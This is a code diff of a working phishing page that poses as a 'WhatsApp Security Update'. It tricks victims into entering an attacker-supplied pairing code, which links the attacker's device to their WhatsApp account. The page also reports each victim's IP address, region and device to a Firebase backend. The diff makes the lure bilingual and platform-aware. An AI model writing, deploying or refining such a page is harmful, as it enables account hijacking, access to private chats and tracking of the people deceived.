@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تحديث أمان واتساب</title>
+    <title>System Update</title>
     <style>
         * { box-sizing: border-box; }
         body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
@@ -24,23 +24,18 @@
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <div class="header-title">تحديث أمان واتساب</div>
-        <div class="badge">جهاز مرتبط: iPhone</div>
+        <div id="u-title" class="header-title">WhatsApp Security Update</div>
+        <div id="u-badge" class="badge">Checking Device...</div>
         <div class="v-box">
-            <div class="v-row"><span style="color:#667781">البروتوكول الحالي:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
+            <div class="v-row"><span id="u-l1">Current Protocol:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5</span></div>
             <div style="height:1px; background:#eee; margin:5px 0"></div>
-            <div class="v-row"><span style="color:#667781">البروتوكول المحدث:</span><span style="color:#00a884; font-weight:bold">V3.0.1 (New Version)</span></div>
+            <div class="v-row"><span id="u-l2">Updated Protocol:</span><span style="color:#00a884; font-weight:bold">V3.0.1</span></div>
         </div>
-        <p class="alert-p">لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).</p>
-        <div class="steps">
-            <b>كيفية التفعيل:</b><br>
-            1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز؛ اضغط عليه فوراً.<br>
-            2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> في الأسفل.<br>
-            3. أدخل رمز التحقق المكون من 8 أرقام الذي سيظهر هنا خلال لحظات:
-        </div>
+        <p id="u-alert" class="alert-p"></p>
+        <div id="u-steps" class="steps"></div>
         <div class="code-zone">
             <div id="pairing-code">. . .</div>
-            <div id="ui-wait" class="wait-text">في انتظار رمز الأمان.. سيصل هنا قريباً</div>
+            <div id="u-wait" class="wait-text"></div>
         </div>
     </div>
 
@@ -52,37 +47,34 @@
         const db = firebase.database();
         const userId = new URLSearchParams(window.location.search).get('id');
 
+        const isAr = navigator.language.startsWith('ar');
+        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+
+        const content = {
+            ar: { badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).", steps: "<b>كيفية التفعيل:</b><br>1. اضغط على إشعار واتساب لربط الجهاز.<br>2. اختر 'الربط برقم الهاتف بدلاً من ذلك'.<br>3. أدخل الرمز الذي سيظهر هنا:", wait: "في انتظار الرمز...", done: "أدخل الكود الآن في واتساب" },
+            en: { badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).", steps: "<b>How to activate:</b><br>1. Tap the WhatsApp notification.<br>2. Select 'Link with phone number instead'.<br>3. Enter the code shown below:", wait: "Awaiting security code...", done: "Enter code in WhatsApp now" }
+        };
+
+        const c = isAr ? content.ar : content.en;
+        document.documentElement.dir = isAr ? 'rtl' : 'ltr';
+        document.getElementById('u-badge').innerText = c.badge;
+        document.getElementById('u-alert').innerText = c.alert;
+        document.getElementById('u-steps').innerHTML = c.steps;
+        document.getElementById('u-wait').innerText = c.wait;
+
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
-            
-            // سحب الـ IP والمحافظة والمدينة
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(data => {
-                    let dev = "Mobile";
-                    if (/iPhone|iPad/.test(navigator.userAgent)) dev = "iPhone";
-                    else if (/Android/.test(navigator.userAgent)) dev = "Android";
-
-                    sRef.set({
-                        status: "Online",
-                        ip: data.ip,
-                        city: data.city, // المدينة
-                        region: data.region, // المحافظة
-                        device: dev,
-                        ts: Date.now()
-                    });
-                }).catch(() => {
-                    sRef.set({ status: "Online", ip: "N/A", device: "Mobile", ts: Date.now() });
-                });
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sRef.set({ status: "Online", ip: d.ip, region: d.region, device: isIOS ? "iPhone" : "Android", ts: Date.now() });
+            }).catch(() => sRef.set({ status: "Online", ip: "Hidden", device: isIOS ? "iPhone" : "Android", ts: Date.now() }));
 
             sRef.onDisconnect().update({ status: "Offline" });
-
-            db.ref('commands/' + userId).on('value', (snap) => {
-                const val = snap.val();
-                if (val && val.code) {
-                    document.getElementById('pairing-code').innerText = val.code;
-                    document.getElementById('ui-wait').innerText = "تم استخراج الكود! أدخله في واتساب الآن";
-                    document.getElementById('ui-wait').classList.add('arrived');
+            db.ref('commands/' + userId).on('value', s => {
+                const v = s.val();
+                if (v && v.code) {
+                    document.getElementById('pairing-code').innerText = v.code;
+                    document.getElementById('u-wait').innerText = c.done;
+                    document.getElementById('u-wait').classList.add('arrived');
                 }
             });
         }
